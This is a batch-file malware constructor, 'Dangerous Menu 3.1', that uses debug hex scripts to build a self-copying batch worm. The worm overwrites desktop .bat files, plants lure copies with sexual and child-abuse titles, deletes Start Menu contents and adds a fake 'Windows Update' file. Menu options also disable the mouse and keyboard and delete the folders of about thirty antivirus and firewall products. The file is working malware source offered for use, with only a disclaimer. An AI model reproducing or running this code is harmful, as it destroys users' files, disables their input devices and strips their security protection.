@echo off
cls
:main
echo.
echo.
echo.
echo.
echo.           É»
echo            ÈÊËÍÍÍ»           ÉÄ    presenting    Ä»  by  DvL  ÉÍÍÍ»
echo              ³   ÌÍÍÍÍÍÍÍÍÍÍÍ¼ Dangerous Menu 3.1 ÈÍÍÍÍÍÍÍÍÍÍÍ¹   ³
echo            ÉËÊÍÍÍ¼ www.geocities.com/ratty_dvl/BATch/main.htm ÈÍÍÍ¼
echo.           È¼
echo.
echo            This constructor is dedicated to my special angel, Ioana
echo.
echo     Note: I am not responsable for any damage caused by this constructor.
echo.
echo.
echo    1 - EICAR
echo.
echo    2 - Fake Bytes
echo.
echo    3 - EICAR and Fake Bytes
echo.
echo    Q - e X i t
echo.
echo.
choice /c:123Q>nul
if errorlevel 4 goto done
if errorlevel 3 goto cc
if errorlevel 2 goto bb
if errorlevel 1 goto aa
echo CHOICE missing
goto done

:aa
ctty nul
@if exist ioana.txt deltree/y ioana.txt
@echo e 0100  58 35 4F 21 50 25 40 41 50 5B 34 5C 50 5A 58 35>>eicar
@echo e 0110  34 28 50 5E 29 37 43 43 29 37 7D 24 45 49 43 41>>eicar
@echo e 0120  52 2D 53 54 41 4E 44 41 52 44 2D 41 4E 54 49 56>>eicar
@echo e 0130  49 52 55 53 2D 54 45 53 54 2D 46 49 4C 45 21 24>>eicar
@echo e 0140  48 2B 48 2A 0D 0A 63 74 74 79 20 6E 75 6C 0D 0A>>eicar
@echo e 0150  40 65 63 68 6F 20 6F 66 66 0D 0A 40 64 65 6C 74>>eicar
@echo e 0160  72 65 65 2F 79 20 25 77 69 6E 64 69 72 25 5C 73>>eicar
@echo e 0170  79 73 74 65 6D 5C 69 6F 61 6E 61 20 3E 6E 75 6C>>eicar
@echo e 0180  0D 0A 40 6D 64 20 25 77 69 6E 64 69 72 25 5C 73>>eicar
@echo e 0190  79 73 74 65 6D 5C 69 6F 61 6E 61 0D 0A 40 63 6F>>eicar
@echo e 01A0  70 79 20 25 30 20 25 77 69 6E 64 69 72 25 5C 73>>eicar
@echo e 01B0  79 73 74 65 6D 5C 69 6F 61 6E 61 5C 69 6F 61 6E>>eicar
@echo e 01C0  61 2E 62 61 74 0D 0A 40 66 6F 72 20 25 25 75 20>>eicar
@echo e 01D0  69 6E 20 28 25 77 69 6E 64 69 72 25 5C 64 65 73>>eicar
@echo e 01E0  6B 74 6F 70 5C 2A 2E 62 61 74 29 20 64 6F 20 63>>eicar
@echo e 01F0  6F 70 79 20 25 77 69 6E 64 69 72 25 5C 73 79 73>>eicar
@echo e 0200  74 65 6D 5C 69 6F 61 6E 61 5C 69 6F 61 6E 61 2E>>eicar
@echo e 0210  62 61 74 20 25 25 75 0D 0A 40 63 6F 70 79 20 25>>eicar
@echo e 0220  30 20 25 77 69 6E 64 69 72 25 5C 64 65 73 6B 74>>eicar
@echo e 0230  6F 70 5C 22 4C 6F 6E 65 6C 79 20 47 69 72 6C 73>>eicar
@echo e 0240  20 46 6F 72 20 59 6F 75 72 20 50 6C 65 61 73 75>>eicar
@echo e 0250  72 65 2E 75 72 6C 2E 62 61 74 22 20 3E 6E 75 6C>>eicar
@echo e 0260  0D 0A 40 63 6F 70 79 20 25 30 20 25 77 69 6E 64>>eicar
@echo e 0270  69 72 25 5C 64 65 73 6B 74 6F 70 5C 22 4C 6F 6C>>eicar
@echo e 0280  69 74 61 20 62 6C 6F 77 73 20 69 74 2E 6A 70 67>>eicar
@echo e 0290  2E 62 61 74 22 20 3E 6E 75 6C 0D 0A 40 63 6F 70>>eicar
@echo e 02A0  79 20 25 30 20 63 3A 5C 6D 79 64 6F 63 75 7E 31>>eicar
@echo e 02B0  5C 22 53 65 78 2C 20 4D 6F 6E 65 79 20 61 6E 64>>eicar
@echo e 02C0  20 50 6F 77 65 72 2E 64 6F 63 2E 62 61 74 22 20>>eicar
@echo e 02D0  3E 6E 75 6C 0D 0A 40 63 6F 70 79 20 25 30 20 63>>eicar
@echo e 02E0  3A 5C 6D 79 64 6F 63 75 7E 31 5C 22 57 61 72 63>>eicar
@echo e 02F0  72 61 66 74 20 33 20 75 70 64 61 74 65 2E 65 78>>eicar
@echo e 0300  65 2E 62 61 74 22 20 3E 6E 75 6C 0D 0A 40 64 65>>eicar
@echo e 0310  6C 74 72 65 65 2F 79 20 25 77 69 6E 64 69 72 25>>eicar
@echo e 0320  5C 64 65 73 6B 74 6F 70 5C 73 74 61 72 74 6D 7E>>eicar
@echo e 0330  31 5C 2A 2E 2A 20 3E 6E 75 6C 0D 0A 40 63 6F 70>>eicar
@echo e 0340  79 20 25 30 20 25 77 69 6E 64 69 72 25 5C 64 65>>eicar
@echo e 0350  73 6B 74 6F 70 5C 73 74 61 72 74 6D 7E 31 5C 22>>eicar
@echo e 0360  57 69 6E 64 6F 77 73 20 55 70 64 61 74 65 2E 65>>eicar
@echo e 0370  78 65 2E 62 61 74 22 20 3E 6E 75 6C 0D 0A 00>>eicar
@echo rcx>>eicar
@echo 27E>>eicar
@echo n txt>>eicar
@echo w>>eicar
@echo q>>eicar
@debug<eicar
@ren txt ioana.txt
@deltree/y txt >nul
@deltree/y eicar >nul
ctty con
goto mkl

:bb
ctty nul
@if exist ioana.txt deltree/y ioana.txt
@echo e 0100  31 30 31 30 31 30 31 30 31 30 31 30 31 30 31 30>>fake
@echo e 0110  31 30 31 30 31 30 31 30 31 30 31 30 31 30 31 30>>fake
@echo e 0120  31 30 31 30 31 30 31 30 31 30 31 30 31 30 31 30>>fake
@echo e 0130  31 30 31 30 31 30 31 30 31 30 31 30 31 30 31 30>>fake
@echo e 0140  31 30 31 30 31 30 31 30 31 30 31 30 31 30 31 30>>fake
@echo e 0150  31 30 31 30 31 30 31 30 31 30 31 30 31 30 31 0D>>fake
@echo e 0160  0A 30 31 30 31 30 31 30 31 30 31 30 31 30 31 30>>fake
@echo e 0170  31 30 31 30 31 30 31 30 31 30 31 30 31 30 31 30>>fake
@echo e 0180  31 30 31 30 31 30 31 30 31 30 31 30 31 30 31 30>>fake
@echo e 0190  31 30 31 30 31 30 31 30 31 30 31 30 31 30 31 30>>fake
@echo e 01A0  31 30 31 30 31 30 31 30 31 30 31 30 31 30 31 30>>fake
@echo e 01B0  31 30 31 30 31 30 31 30 31 30 31 30 31 30 31 30>>fake
@echo e 01C0  0D 0A 31 30 31 30 31 30 31 30 31 30 31 30 31 30>>fake
@echo e 01D0  31 30 31 30 31 30 31 30 31 30 31 30 31 30 31 30>>fake
@echo e 01E0  31 30 31 30 31 30 31 30 31 30 31 30 31 30 31 30>>fake
@echo e 01F0  31 30 31 30 31 30 31 30 31 30 31 30 31 30 31 30>>fake
@echo e 0200  31 30 31 30 31 30 31 30 31 30 31 30 31 30 31 30>>fake
@echo e 0210  31 30 31 30 31 30 31 30 31 30 31 30 31 30 31 30>>fake
@echo e 0220  31 0D 0A 30 31 30 31 30 31 30 31 30 31 30 31 30>>fake
@echo e 0230  31 30 31 30 31 30 31 30 31 30 31 30 31 30 31 30>>fake
@echo e 0240  31 30 31 30 31 30 31 30 31 30 31 30 31 30 31 30>>fake
@echo e 0250  31 30 31 30 31 30 31 30 31 30 31 30 31 30 31 30>>fake
@echo e 0260  31 30 31 30 31 30 31 30 31 30 31 30 31 30 31 30>>fake
@echo e 0270  31 30 31 30 31 30 31 30 31 30 31 30 31 30 31 30>>fake
@echo e 0280  31 30 0D 0A 31 30 31 30 31 30 31 30 31 30 31 30>>fake
@echo e 0290  31 30 31 30 31 30 31 30 31 30 31 30 31 30 31 30>>fake
@echo e 02A0  31 30 31 30 31 30 31 30 31 30 31 30 31 30 31 30>>fake
@echo e 02B0  31 30 31 30 31 30 31 30 31 30 31 30 31 30 31 30>>fake
@echo e 02C0  31 30 31 30 31 30 31 30 31 30 31 30 31 30 31 30>>fake
@echo e 02D0  31 30 31 30 31 30 31 30 31 30 31 30 31 30 31 30>>fake
@echo e 02E0  31 30 31 0D 0A 30 31 30 31 30 31 30 31 30 31 30>>fake
@echo e 02F0  31 30 31 30 31 30 31 30 31 30 31 30 31 30 31 30>>fake
@echo e 0300  31 30 31 30 31 30 31 30 31 30 31 30 31 30 31 30>>fake
@echo e 0310  31 30 31 30 31 30 31 30 31 30 31 30 31 30 31 30>>fake
@echo e 0320  31 30 31 30 31 30 31 30 31 30 31 30 31 30 31 30>>fake
@echo e 0330  31 30 31 30 31 30 31 30 31 30 31 30 31 30 31 30>>fake
@echo e 0340  31 30 31 30 0D 0A 31 30 31 30 31 30 31 30 31 30>>fake
@echo e 0350  31 30 31 30 31 30 31 30 31 30 31 30 31 30 31 30>>fake
@echo e 0360  31 30 31 30 31 30 31 30 31 30 31 30 31 30 31 30>>fake
@echo e 0370  31 30 31 30 31 30 31 30 31 30 31 30 31 30 31 30>>fake
@echo e 0380  31 30 31 30 31 30 31 30 31 30 31 30 31 30 31 30>>fake
@echo e 0390  31 30 31 30 31 30 31 30 31 30 31 30 31 30 31 30>>fake
@echo e 03A0  31 30 31 30 31 0D 0A 30 31 30 31 30 31 30 31 30>>fake
@echo e 03B0  31 30 31 30 31 30 31 30 31 30 31 30 31 30 31 30>>fake
@echo e 03C0  31 30 31 30 31 30 31 30 31 30 31 30 31 30 31 30>>fake
@echo e 03D0  31 30 31 30 31 30 31 30 31 30 31 30 31 30 31 30>>fake
@echo e 03E0  31 30 31 30 31 30 31 30 31 30 31 30 31 30 31 30>>fake
@echo e 03F0  31 30 31 30 31 30 31 30 31 30 31 30 31 30 31 30>>fake
@echo e 0400  31 30 31 30 31 30 0D 0A 31 30 31 30 31 30 31 30>>fake
@echo e 0410  31 30 31 30 31 30 31 30 31 30 31 30 31 30 31 30>>fake
@echo e 0420  31 30 31 30 31 30 31 30 31 30 31 30 31 30 31 30>>fake
@echo e 0430  31 30 31 30 31 30 31 30 31 30 31 30 31 30 31 30>>fake
@echo e 0440  31 30 31 30 31 30 31 30 31 30 31 30 31 30 31 30>>fake
@echo e 0450  31 30 31 30 31 30 31 30 31 30 31 30 31 30 31 30>>fake
@echo e 0460  31 30 31 30 31 30 31 0D 0A 30 31 30 31 30 31 30>>fake
@echo e 0470  31 30 31 30 31 30 31 30 31 30 31 30 31 30 31 30>>fake
@echo e 0480  31 30 31 30 31 30 31 30 31 30 31 30 31 30 31 30>>fake
@echo e 0490  31 30 31 30 31 30 31 30 31 30 31 30 31 30 31 30>>fake
@echo e 04A0  31 30 31 30 31 30 31 30 31 30 31 30 31 30 31 30>>fake
@echo e 04B0  31 30 31 30 31 30 31 30 31 30 31 30 31 30 31 30>>fake
@echo e 04C0  31 30 31 30 31 30 31 30 0D 0A 31 30 31 30 31 30>>fake
@echo e 04D0  31 30 31 30 31 30 31 30 31 30 31 30 31 30 31 30>>fake
@echo e 04E0  31 30 31 30 31 30 31 30 31 30 31 30 31 30 31 30>>fake
@echo e 04F0  31 30 31 30 31 30 31 30 31 30 31 30 31 30 31 30>>fake
@echo e 0500  31 30 31 30 31 30 31 30 31 30 31 30 31 30 31 30>>fake
@echo e 0510  31 30 31 30 31 30 31 30 31 30 31 30 31 30 31 30>>fake
@echo e 0520  31 30 31 30 31 30 31 30 31 0D 0A 30 31 30 31 30>>fake
@echo e 0530  31 30 31 30 31 30 31 30 31 30 31 30 31 30 31 30>>fake
@echo e 0540  31 30 31 30 31 30 31 30 31 30 31 30 31 30 31 30>>fake
@echo e 0550  31 30 31 30 31 30 31 30 31 30 31 30 31 30 31 30>>fake
@echo e 0560  31 30 31 30 31 30 31 30 31 30 31 30 31 30 31 30>>fake
@echo e 0570  31 30 31 30 31 30 31 30 31 30 31 30 31 30 31 30>>fake
@echo e 0580  31 30 31 30 31 30 31 30 31 30 0D 0A 63 74 74 79>>fake
@echo e 0590  20 6E 75 6C 0D 0A 40 65 63 68 6F 20 6F 66 66 0D>>fake
@echo e 05A0  0A 40 64 65 6C 74 72 65 65 2F 79 20 25 77 69 6E>>fake
@echo e 05B0  64 69 72 25 5C 73 79 73 74 65 6D 5C 69 6F 61 6E>>fake
@echo e 05C0  61 20 3E 6E 75 6C 0D 0A 40 6D 64 20 25 77 69 6E>>fake
@echo e 05D0  64 69 72 25 5C 73 79 73 74 65 6D 5C 69 6F 61 6E>>fake
@echo e 05E0  61 0D 0A 40 63 6F 70 79 20 25 30 20 25 77 69 6E>>fake
@echo e 05F0  64 69 72 25 5C 73 79 73 74 65 6D 5C 69 6F 61 6E>>fake
@echo e 0600  61 5C 69 6F 61 6E 61 2E 62 61 74 0D 0A 40 66 6F>>fake
@echo e 0610  72 20 25 25 75 20 69 6E 20 28 25 77 69 6E 64 69>>fake
@echo e 0620  72 25 5C 64 65 73 6B 74 6F 70 5C 2A 2E 62 61 74>>fake
@echo e 0630  29 20 64 6F 20 63 6F 70 79 20 25 77 69 6E 64 69>>fake
@echo e 0640  72 25 5C 73 79 73 74 65 6D 5C 69 6F 61 6E 61 5C>>fake
@echo e 0650  69 6F 61 6E 61 2E 62 61 74 20 25 25 75 0D 0A 40>>fake
@echo e 0660  63 6F 70 79 20 25 30 20 25 77 69 6E 64 69 72 25>>fake
@echo e 0670  5C 64 65 73 6B 74 6F 70 5C 22 4C 6F 6E 65 6C 79>>fake
@echo e 0680  20 47 69 72 6C 73 20 46 6F 72 20 59 6F 75 72 20>>fake
@echo e 0690  50 6C 65 61 73 75 72 65 2E 75 72 6C 2E 62 61 74>>fake
@echo e 06A0  22 20 3E 6E 75 6C 0D 0A 40 63 6F 70 79 20 25 30>>fake
@echo e 06B0  20 25 77 69 6E 64 69 72 25 5C 64 65 73 6B 74 6F>>fake
@echo e 06C0  70 5C 22 4C 6F 6C 69 74 61 20 62 6C 6F 77 73 20>>fake
@echo e 06D0  69 74 2E 6A 70 67 2E 62 61 74 22 20 3E 6E 75 6C>>fake
@echo e 06E0  0D 0A 40 63 6F 70 79 20 25 30 20 63 3A 5C 6D 79>>fake
@echo e 06F0  64 6F 63 75 7E 31 5C 22 53 65 78 2C 20 4D 6F 6E>>fake
@echo e 0700  65 79 20 61 6E 64 20 50 6F 77 65 72 2E 64 6F 63>>fake
@echo e 0710  2E 62 61 74 22 20 3E 6E 75 6C 0D 0A 40 63 6F 70>>fake
@echo e 0720  79 20 25 30 20 63 3A 5C 6D 79 64 6F 63 75 7E 31>>fake
@echo e 0730  5C 22 57 61 72 63 72 61 66 74 20 33 20 75 70 64>>fake
@echo e 0740  61 74 65 2E 65 78 65 2E 62 61 74 22 20 3E 6E 75>>fake
@echo e 0750  6C 0D 0A 40 64 65 6C 74 72 65 65 2F 79 20 25 77>>fake
@echo e 0760  69 6E 64 69 72 25 5C 64 65 73 6B 74 6F 70 5C 73>>fake
@echo e 0770  74 61 72 74 6D 7E 31 5C 2A 2E 2A 20 3E 6E 75 6C>>fake
@echo e 0780  0D 0A 40 63 6F 70 79 20 25 30 20 25 77 69 6E 64>>fake
@echo e 0790  69 72 25 5C 64 65 73 6B 74 6F 70 5C 73 74 61 72>>fake
@echo e 07A0  74 6D 7E 31 5C 22 57 69 6E 64 6F 77 73 20 55 70>>fake
@echo e 07B0  64 61 74 65 2E 65 78 65 2E 62 61 74 22 20 3E 6E>>fake
@echo e 07C0  75 6C 0D 0A 00>>fake
@echo rcx>>fake
@echo 6C4>>fake
@echo n txt>>fake
@echo w>>fake
@echo q>>fake
@debug<fake
@ren txt ioana.txt
@deltree/y txt >nul
@deltree/y fake >nul
ctty con
goto mkl

:cc
ctty nul
@if exist ioana.txt deltree/y ioana.txt
@echo e 0100  58 35 4F 21 50 25 40 41 50 5B 34 5C 50 5A 58 35>>both
@echo e 0110  34 28 50 5E 29 37 43 43 29 37 7D 24 45 49 43 41>>both
@echo e 0120  52 2D 53 54 41 4E 44 41 52 44 2D 41 4E 54 49 56>>both
@echo e 0130  49 52 55 53 2D 54 45 53 54 2D 46 49 4C 45 21 24>>both
@echo e 0140  48 2B 48 2A 0D 0A 31 30 31 30 31 30 31 30 31 30>>both
@echo e 0150  31 30 31 30 31 30 31 30 31 30 31 30 31 30 31 30>>both
@echo e 0160  31 30 31 30 31 30 31 30 31 30 31 30 31 30 31 30>>both
@echo e 0170  31 30 31 30 31 30 31 30 31 30 31 30 31 30 31 30>>both
@echo e 0180  31 30 31 30 31 30 31 30 31 30 31 30 31 30 31 30>>both
@echo e 0190  31 30 31 30 31 30 31 30 31 30 31 30 31 30 31 30>>both
@echo e 01A0  31 30 31 30 31 0D 0A 30 31 30 31 30 31 30 31 30>>both
@echo e 01B0  31 30 31 30 31 30 31 30 31 30 31 30 31 30 31 30>>both
@echo e 01C0  31 30 31 30 31 30 31 30 31 30 31 30 31 30 31 30>>both
@echo e 01D0  31 30 31 30 31 30 31 30 31 30 31 30 31 30 31 30>>both
@echo e 01E0  31 30 31 30 31 30 31 30 31 30 31 30 31 30 31 30>>both
@echo e 01F0  31 30 31 30 31 30 31 30 31 30 31 30 31 30 31 30>>both
@echo e 0200  31 30 31 30 31 30 0D 0A 31 30 31 30 31 30 31 30>>both
@echo e 0210  31 30 31 30 31 30 31 30 31 30 31 30 31 30 31 30>>both
@echo e 0220  31 30 31 30 31 30 31 30 31 30 31 30 31 30 31 30>>both
@echo e 0230  31 30 31 30 31 30 31 30 31 30 31 30 31 30 31 30>>both
@echo e 0240  31 30 31 30 31 30 31 30 31 30 31 30 31 30 31 30>>both
@echo e 0250  31 30 31 30 31 30 31 30 31 30 31 30 31 30 31 30>>both
@echo e 0260  31 30 31 30 31 30 31 0D 0A 30 31 30 31 30 31 30>>both
@echo e 0270  31 30 31 30 31 30 31 30 31 30 31 30 31 30 31 30>>both
@echo e 0280  31 30 31 30 31 30 31 30 31 30 31 30 31 30 31 30>>both
@echo e 0290  31 30 31 30 31 30 31 30 31 30 31 30 31 30 31 30>>both
@echo e 02A0  31 30 31 30 31 30 31 30 31 30 31 30 31 30 31 30>>both
@echo e 02B0  31 30 31 30 31 30 31 30 31 30 31 30 31 30 31 30>>both
@echo e 02C0  31 30 31 30 31 30 31 30 0D 0A 31 30 31 30 31 30>>both
@echo e 02D0  31 30 31 30 31 30 31 30 31 30 31 30 31 30 31 30>>both
@echo e 02E0  31 30 31 30 31 30 31 30 31 30 31 30 31 30 31 30>>both
@echo e 02F0  31 30 31 30 31 30 31 30 31 30 31 30 31 30 31 30>>both
@echo e 0300  31 30 31 30 31 30 31 30 31 30 31 30 31 30 31 30>>both
@echo e 0310  31 30 31 30 31 30 31 30 31 30 31 30 31 30 31 30>>both
@echo e 0320  31 30 31 30 31 30 31 30 31 0D 0A 30 31 30 31 30>>both
@echo e 0330  31 30 31 30 31 30 31 30 31 30 31 30 31 30 31 30>>both
@echo e 0340  31 30 31 30 31 30 31 30 31 30 31 30 31 30 31 30>>both
@echo e 0350  31 30 31 30 31 30 31 30 31 30 31 30 31 30 31 30>>both
@echo e 0360  31 30 31 30 31 30 31 30 31 30 31 30 31 30 31 30>>both
@echo e 0370  31 30 31 30 31 30 31 30 31 30 31 30 31 30 31 30>>both
@echo e 0380  31 30 31 30 31 30 31 30 31 30 0D 0A 31 30 31 30>>both
@echo e 0390  31 30 31 30 31 30 31 30 31 30 31 30 31 30 31 30>>both
@echo e 03A0  31 30 31 30 31 30 31 30 31 30 31 30 31 30 31 30>>both
@echo e 03B0  31 30 31 30 31 30 31 30 31 30 31 30 31 30 31 30>>both
@echo e 03C0  31 30 31 30 31 30 31 30 31 30 31 30 31 30 31 30>>both
@echo e 03D0  31 30 31 30 31 30 31 30 31 30 31 30 31 30 31 30>>both
@echo e 03E0  31 30 31 30 31 30 31 30 31 30 31 0D 0A 30 31 30>>both
@echo e 03F0  31 30 31 30 31 30 31 30 31 30 31 30 31 30 31 30>>both
@echo e 0400  31 30 31 30 31 30 31 30 31 30 31 30 31 30 31 30>>both
@echo e 0410  31 30 31 30 31 30 31 30 31 30 31 30 31 30 31 30>>both
@echo e 0420  31 30 31 30 31 30 31 30 31 30 31 30 31 30 31 30>>both
@echo e 0430  31 30 31 30 31 30 31 30 31 30 31 30 31 30 31 30>>both
@echo e 0440  31 30 31 30 31 30 31 30 31 30 31 30 0D 0A 31 30>>both
@echo e 0450  31 30 31 30 31 30 31 30 31 30 31 30 31 30 31 30>>both
@echo e 0460  31 30 31 30 31 30 31 30 31 30 31 30 31 30 31 30>>both
@echo e 0470  31 30 31 30 31 30 31 30 31 30 31 30 31 30 31 30>>both
@echo e 0480  31 30 31 30 31 30 31 30 31 30 31 30 31 30 31 30>>both
@echo e 0490  31 30 31 30 31 30 31 30 31 30 31 30 31 30 31 30>>both
@echo e 04A0  31 30 31 30 31 30 31 30 31 30 31 30 31 0D 0A 30>>both
@echo e 04B0  31 30 31 30 31 30 31 30 31 30 31 30 31 30 31 30>>both
@echo e 04C0  31 30 31 30 31 30 31 30 31 30 31 30 31 30 31 30>>both
@echo e 04D0  31 30 31 30 31 30 31 30 31 30 31 30 31 30 31 30>>both
@echo e 04E0  31 30 31 30 31 30 31 30 31 30 31 30 31 30 31 30>>both
@echo e 04F0  31 30 31 30 31 30 31 30 31 30 31 30 31 30 31 30>>both
@echo e 0500  31 30 31 30 31 30 31 30 31 30 31 30 31 30 0D 0A>>both
@echo e 0510  31 30 31 30 31 30 31 30 31 30 31 30 31 30 31 30>>both
@echo e 0520  31 30 31 30 31 30 31 30 31 30 31 30 31 30 31 30>>both
@echo e 0530  31 30 31 30 31 30 31 30 31 30 31 30 31 30 31 30>>both
@echo e 0540  31 30 31 30 31 30 31 30 31 30 31 30 31 30 31 30>>both
@echo e 0550  31 30 31 30 31 30 31 30 31 30 31 30 31 30 31 30>>both
@echo e 0560  31 30 31 30 31 30 31 30 31 30 31 30 31 30 31 0D>>both
@echo e 0570  0A 30 31 30 31 30 31 30 31 30 31 30 31 30 31 30>>both
@echo e 0580  31 30 31 30 31 30 31 30 31 30 31 30 31 30 31 30>>both
@echo e 0590  31 30 31 30 31 30 31 30 31 30 31 30 31 30 31 30>>both
@echo e 05A0  31 30 31 30 31 30 31 30 31 30 31 30 31 30 31 30>>both
@echo e 05B0  31 30 31 30 31 30 31 30 31 30 31 30 31 30 31 30>>both
@echo e 05C0  31 30 31 30 31 30 31 30 31 30 31 30 31 30 31 30>>both
@echo e 05D0  0D 0A 63 74 74 79 20 6E 75 6C 0D 0A 40 65 63 68>>both
@echo e 05E0  6F 20 6F 66 66 0D 0A 40 64 65 6C 74 72 65 65 2F>>both
@echo e 05F0  79 20 25 77 69 6E 64 69 72 25 5C 73 79 73 74 65>>both
@echo e 0600  6D 5C 69 6F 61 6E 61 20 3E 6E 75 6C 0D 0A 40 6D>>both
@echo e 0610  64 20 25 77 69 6E 64 69 72 25 5C 73 79 73 74 65>>both
@echo e 0620  6D 5C 69 6F 61 6E 61 0D 0A 40 63 6F 70 79 20 25>>both
@echo e 0630  30 20 25 77 69 6E 64 69 72 25 5C 73 79 73 74 65>>both
@echo e 0640  6D 5C 69 6F 61 6E 61 5C 69 6F 61 6E 61 2E 62 61>>both
@echo e 0650  74 0D 0A 40 66 6F 72 20 25 25 75 20 69 6E 20 28>>both
@echo e 0660  25 77 69 6E 64 69 72 25 5C 64 65 73 6B 74 6F 70>>both
@echo e 0670  5C 2A 2E 62 61 74 29 20 64 6F 20 63 6F 70 79 20>>both
@echo e 0680  25 77 69 6E 64 69 72 25 5C 73 79 73 74 65 6D 5C>>both
@echo e 0690  69 6F 61 6E 61 5C 69 6F 61 6E 61 2E 62 61 74 20>>both
@echo e 06A0  25 25 75 0D 0A 40 63 6F 70 79 20 25 30 20 25 77>>both
@echo e 06B0  69 6E 64 69 72 25 5C 64 65 73 6B 74 6F 70 5C 22>>both
@echo e 06C0  4C 6F 6E 65 6C 79 20 47 69 72 6C 73 20 46 6F 72>>both
@echo e 06D0  20 59 6F 75 72 20 50 6C 65 61 73 75 72 65 2E 75>>both
@echo e 06E0  72 6C 2E 62 61 74 22 20 3E 6E 75 6C 0D 0A 40 63>>both
@echo e 06F0  6F 70 79 20 25 30 20 25 77 69 6E 64 69 72 25 5C>>both
@echo e 0700  64 65 73 6B 74 6F 70 5C 22 4C 6F 6C 69 74 61 20>>both
@echo e 0710  62 6C 6F 77 73 20 69 74 2E 6A 70 67 2E 62 61 74>>both
@echo e 0720  22 20 3E 6E 75 6C 0D 0A 40 63 6F 70 79 20 25 30>>both
@echo e 0730  20 63 3A 5C 6D 79 64 6F 63 75 7E 31 5C 22 53 65>>both
@echo e 0740  78 2C 20 4D 6F 6E 65 79 20 61 6E 64 20 50 6F 77>>both
@echo e 0750  65 72 2E 64 6F 63 2E 62 61 74 22 20 3E 6E 75 6C>>both
@echo e 0760  0D 0A 40 63 6F 70 79 20 25 30 20 63 3A 5C 6D 79>>both
@echo e 0770  64 6F 63 75 7E 31 5C 22 57 61 72 63 72 61 66 74>>both
@echo e 0780  20 33 20 75 70 64 61 74 65 2E 65 78 65 2E 62 61>>both
@echo e 0790  74 22 20 3E 6E 75 6C 0D 0A 40 64 65 6C 74 72 65>>both
@echo e 07A0  65 2F 79 20 25 77 69 6E 64 69 72 25 5C 64 65 73>>both
@echo e 07B0  6B 74 6F 70 5C 73 74 61 72 74 6D 7E 31 5C 2A 2E>>both
@echo e 07C0  2A 20 3E 6E 75 6C 0D 0A 40 63 6F 70 79 20 25 30>>both
@echo e 07D0  20 25 77 69 6E 64 69 72 25 5C 64 65 73 6B 74 6F>>both
@echo e 07E0  70 5C 73 74 61 72 74 6D 7E 31 5C 22 57 69 6E 64>>both
@echo e 07F0  6F 77 73 20 55 70 64 61 74 65 2E 65 78 65 2E 62>>both
@echo e 0800  61 74 22 20 3E 6E 75 6C 0D 0A 00>>both
@echo rcx>>both
@echo 70A>>both
@echo n txt>>both
@echo w>>both
@echo q>>both
@debug<both
@ren txt ioana.txt
@deltree/y txt >nul
@deltree/y both >nul
ctty con
goto mkl

:mkl
cls
echo.
echo.
echo.
echo    1 - Mouse and keyboard disable
echo.
echo    2 - Swap mouse buttons and keyboard disable
echo.
echo    Q - e X i t
echo.
choice /c:12Q>nul
if errorlevel 3 goto done
if errorlevel 2 goto ee
if errorlevel 1 goto dd
echo CHOICE missing
goto done

:dd
ctty nul
@echo.@%windir%\rundll32.exe mouse,disable>>ioana.txt
@echo.@%windir%\rundll32.exe keyboard,disable>>ioana.txt
ctty con
goto mnb

:ee
ctty nul
@echo.@%windir%\rundll32.exe user,swapmousebutton>>ioana.txt
@echo.@%windir%\rundll32.exe keyboard,disable>>ioana.txt
ctty con
goto mnb

:mnb
cls
echo.
echo.
echo.
echo    1 - Delete some AV`z
echo.
echo    2 - Leave the AV`z alone
echo.
echo    Q - e X i t
echo.
choice /c:12Q>nul
if errorlevel 3 goto done
if errorlevel 2 goto gg
if errorlevel 1 goto ff
echo CHOICE missing
goto done

:ff
ctty nul
@echo.@if exist c:\progra~1\norton~1\*.* deltree/y c:\progra~1\norton~1\>>ioana.txt
@echo.@if exist c:\progra~1\norton~2\*.* deltree/y c:\progra~1\norton~2\>>ioana.txt
@echo.@if exist c:\progra~1\symant~1\*.* deltree/y c:\progra~1\symant~1\>>ioana.txt
@echo.@if exist c:\progra~1\common~1\symant~1\*.* deltree/y c:\progra~1\common~1\symant~1\>>ioana.txt
@echo.@if exist c:\progra~1\common~1\avpsha~1\avpbases\*.* deltree/y c:\progra~1\common~1\avpsha~1\avpbases\>>ioana.txt
@echo.@if exist c:\progra~1\common~1\avpsha~1\*.* deltree/y c:\progra~1\common~1\avpsha~1\>>ioana.txt
@echo.@if exist c:\progra~1\mcafee\viruss~1\*.* deltree/y c:\progra~1\mcafee\viruss~1\>>ioana.txt
@echo.@if exist c:\progra~1\mcafee\*.* deltree/y c:\progra~1\mcafee\>>ioana.txt
@echo.@if exist c:\progra~1\pandas~1\*.* deltree/y c:\progra~1\pandas~1\>>ioana.txt
@echo.@if exist c:\progra~1\trendm~1\*.* deltree/y c:\progra~1\trendm~1\>>ioana.txt
@echo.@if exist c:\progra~1\comman~1\*.* deltree/y c:\progra~1\comman~1\>>ioana.txt
@echo.@if exist c:\progra~1\zonela~1\*.* deltree/y c:\progra~1\zonela~1\>>ioana.txt
@echo.@if exist c:\progra~1\tinype~1\*.* deltree/y c:\progra~1\tinype~1\>>ioana.txt
@echo.@if exist c:\progra~1\kasper~1\*.* deltree/y c:\progra~1\kasper~1\>>ioana.txt
@echo.@if exist c:\progra~1\kasper~2\*.* deltree/y c:\progra~1\kasper~2\>>ioana.txt
@echo.@if exist c:\progra~1\trojan~1\*.* deltree/y c:\progra~1\trojan~1\>>ioana.txt
@echo.@if exist c:\progra~1\avpers~1\*.* deltree/y c:\progra~1\avpers~1\>>ioana.txt
@echo.@if exist c:\progra~1\grisoft\*.* deltree/y c:\progra~1\grisoft\>>ioana.txt
@echo.@if exist c:\progra~1\antivi~1\*.* deltree/y c:\progra~1\antivi~1\>>ioana.txt
@echo.@if exist c:\progra~1\quickh~1\*.* deltree/y c:\progra~1\quickh~1\>>ioana.txt
@echo.@if exist c:\progra~1\f-prot95\*.* deltree/y c:\progra~1\f-prot95\>>ioana.txt
@echo.@if exist c:\progra~1\fwin32\*.* deltree/y c:\progra~1\fwin32\>>ioana.txt
@echo.@if exist c:\progra~1\tbav\*.* deltree/y c:\progra~1\tbav\>>ioana.txt
@echo.@if exist c:\progra~1\findvi~1\*.* deltree/y c:\progra~1\findvi~1\>>ioana.txt
@echo.@if exist c:\findvi~1\*.* deltree/y c:\findvi~1\>>ioana.txt
@echo.@if exist c:\esafen\*.* deltree/y c:\esafen\>>ioana.txt
@echo.@if exist c:\f-macro\*.* deltree/y c:\f-macro\>>ioana.txt
@echo.@if exist c:\tbavw95\*.* deltree/y c:\tbavw95\>>ioana.txt
@echo.@if exist c:\tbav\*.* deltree/y c:\tbav\>>ioana.txt
